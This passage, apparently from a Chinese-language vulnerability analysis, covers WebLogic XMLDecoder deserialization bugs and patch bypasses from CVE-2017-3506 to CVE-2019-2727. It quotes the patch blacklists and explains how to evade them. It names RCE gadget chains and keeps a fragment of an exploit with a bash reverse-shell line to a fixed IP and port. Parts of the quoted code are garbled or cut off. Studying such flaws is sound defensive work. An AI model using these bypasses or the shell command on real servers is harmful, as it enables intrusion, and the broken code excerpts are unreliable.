继续跟进readEntry()函数
weblogic.workarea.spi.WorkContextEntryImpl#readEntry
继续跟进readUTF()函数
调用了xmlDecoder的`readObject`函数进行反序列化操作，最终造成命令执行
整个调用栈如下
    readUTF:111, WorkContextXmlInputAdapter (weblogic.wsee.workarea)
    readEntry:92, WorkContextEntryImpl (weblogic.workarea.spi)
    receiveRequest:179, WorkContextLocalMap (weblogic.workarea)
    receiveRequest:163, WorkContextMapImpl (weblogic.workarea)
    receive:71, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
    readHeaderOld:107, WorkContextTube (weblogic.wsee.jaxws.workcontext)
    processRequest:43, WorkContextServerTube (weblogic.wsee.jaxws.workcontext)
    __doRun:866, Fiber (com.sun.xml.ws.api.pipe)
    _doRun:815, Fiber (com.sun.xml.ws.api.pipe)
    doRun:778, Fiber (com.sun.xml.ws.api.pipe)
    runSync:680, Fiber (com.sun.xml.ws.api.pipe)
    process:403, WSEndpointImpl$2 (com.sun.xml.ws.server)
    handle:539, HttpAdapter$HttpToolkit (com.sun.xml.ws.transport.http)
    handle:253, HttpAdapter (com.sun.xml.ws.transport.http)
    handle:140, ServletAdapter (com.sun.xml.ws.transport.http.servlet)
    handle:171, WLSServletAdapter (weblogic.wsee.jaxws)
    run:708, HttpServletAdapter$AuthorizedInvoke (weblogic.wsee.jaxws)
    doAs:363, AuthenticatedSubject (weblogic.security.acl.internal)
    runAs:146, SecurityManager (weblogic.security.service)
    authenticatedInvoke:103, ServerSecurityHelper (weblogic.wsee.util)
    run:311, HttpServletAdapter$3 (weblogic.wsee.jaxws)
    post:336, HttpServletAdapter (weblogic.wsee.jaxws)
    doRequest:99, JAXWSServlet (weblogic.wsee.jaxws)
    service:99, AbstractAsyncServlet (weblogic.servlet.http)
    service:820, HttpServlet (javax.servlet.http)
    run:227, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
    invokeServlet:125, StubSecurityHelper (weblogic.servlet.internal)
    execute:301, ServletStubImpl (weblogic.servlet.internal)
    execute:184, ServletStubImpl (weblogic.servlet.internal)
    wrapRun:3732, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
    run:3696, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
    doAs:321, AuthenticatedSubject (weblogic.security.acl.internal)
    runAs:120, SecurityManager (weblogic.security.service)
    securedExecute:2273, WebAppServletContext (weblogic.servlet.internal)
    execute:2179, WebAppServletContext (weblogic.servlet.internal)
    run:1490, ServletRequestImpl (weblogic.servlet.internal)
    execute:256, ExecuteThread (weblogic.work)
    run:221, ExecuteThread (weblogic.work)
### CVE-2017-3506补丁分析
这里补丁在`WorkContextXmlInputAdapter`中添加了`validate`验证，限制了object标签，从而限制通过XML来构造类
    private void validate(InputStream is) {
          WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
          try {
             SAXParser parser = factory.newSAXParser();
             parser.parse(is, new DefaultHandler() {
                public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
                   if(qName.equalsIgnoreCase("object")) {
                      throw new IllegalStateException("Invalid context type: object");
                   }
                }
             });
          } catch (ParserConfigurationException var5) {
             throw new IllegalStateException("Parser Exception", var5);
          } catch (SAXException var6) {
             throw new IllegalStateException("Parser Exception", var6);
          } catch (IOException var7) {
             throw new IllegalStateException("Parser Exception", var7);
          }
       }
绕过方法很简单，将`object`修改成`void`，也就是最开始漏洞复现的exp
### CVE-2017-10271补丁分析
    private void validate(InputStream is) {
       WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
       try {
          SAXParser parser = factory.newSAXParser();
          parser.parse(is, new DefaultHandler() {
             private int overallarraylength = 0;
             public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
                if(qName.equalsIgnoreCase("object")) {
                   throw new IllegalStateException("Invalid element qName:object");
                } else if(qName.equalsIgnoreCase("new")) {
                   throw new IllegalStateException("Invalid element qName:new");
                } else if(qName.equalsIgnoreCase("method")) {
                   throw new IllegalStateException("Invalid element qName:method");
                } else {
                   if(qName.equalsIgnoreCase("void")) {
                      for(int attClass = 0; attClass  
    xx
    xx
    /bin/bash
    -c
    bash -i >& /dev/tcp/192.168.50.145/4444 0>&1
### CVE-2017-10271补丁绕过分析及利用方式
除了_async组件的反序列化还有如下补丁绕过方式，由于环境原因不能细致分析
使用class标签构造类，但是由于限制了method函数，无法进行函数调用，只能从构造方法下手，且参数为基本类型：
  * 构造函数有写文件操作，文件名和内容可控，可以进行getshell。
  * 构造函数有其他的反序列化操作，我们可以进行二次反序列化操作。
  * 构造函数直接有执行命令的操作，执行命令可控。
  * 有其它的可能导致rce的操作，比如表达式注入之类的。
目前存在的利用链有：
  * FileSystemXmlApplicationContext-RCE
  * UnitOfWorkChangeSet-RCE
  * ysoserial-jdk7u21-RCE
  * JtaTransactionManager-JNDI注入
## CVE-2019-2727
CVE-2019-2725的补丁如下
    private void validate(InputStream is) {
    WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try {
    SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() {
    private int overallarraylength = 0;
             public void startElement(String uri, String localName, String qName,
    Attributes attributes) throws SAXException {
    if (qName.equalsIgnoreCase("object")) { throw new IllegalStateException("Invalid } else if (qName.equalsIgnoreCase("class")) throw new IllegalStateException("Invalid } else if (qName.equalsIgnoreCase("new")) { throw new IllegalStateException("Invalid
    element qName:object"); {
    element qName:class");
    element qName:new"); } else if (qName.equalsIgnoreCase("method")) {
    throw new IllegalStateException("Invalid element qName:method"); } else {
    if (qName.equalsIgnoreCase("void")) {
    for(int i = 0; i =
    WorkContextXmlInputAdapter.MAXARRAYLENGTH) {
    throw new IllegalStateException("Exceed array length
    limitation");
    }
    this.overallarraylength += length; if (this.overallarraylength >=
    WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) {
    throw new IllegalStateException("Exceed over all
    array limitation.");
    }
                         }
这里同样使用了黑名单禁用了`class`标签，使用 `` 代替 class 标签即可
exp就是上面cve-2019-2725的exp
# 参考文档